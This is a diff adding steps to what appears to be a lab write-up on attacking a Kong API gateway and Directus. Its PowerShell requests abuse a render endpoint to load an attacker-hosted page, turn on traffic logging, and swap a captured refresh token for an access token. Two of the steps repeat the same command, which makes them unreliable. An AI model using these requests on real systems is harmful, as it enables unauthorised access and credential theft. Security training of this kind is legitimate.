@@ -133,3 +133,17 @@ Lastly we can verify the gateway is not hung up by reusing one of our previous p
 ```powershell
 iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163/callback?gatewaynothung"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
 ```
+
+With the other plugins available in Kong API Gateway, find a way to log all traffic passing through the gateway. Inspect the traffic for any sensitive data. You should only need five to ten minutes worth of logging. The logging plugin can be disabled by sending a GET request to /plugins to get the plugin's id, then sending a DELETE request to /plugins/{id}. Review the authentication documentation for Directus2 and use the logged data to gain access to a valid access token for Directus:
+Enumerate all services:
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163/traffic-log.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+Setup directus logging on all services:
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163/traffic-log.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
+Gaining a valid access token, the only part we have to change is the reset token:
+```powershell
+iwr -Uri "http://apigateway:8000/auth/refresh" -method Post -body (@{"refresh_token"="QcgJIS2Jq5rbaiBQBNVIWexc2FlfVNgVJ-0irf03Fc_NMdpgo93Hprg3_hmQpT16"; "mode"="json"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
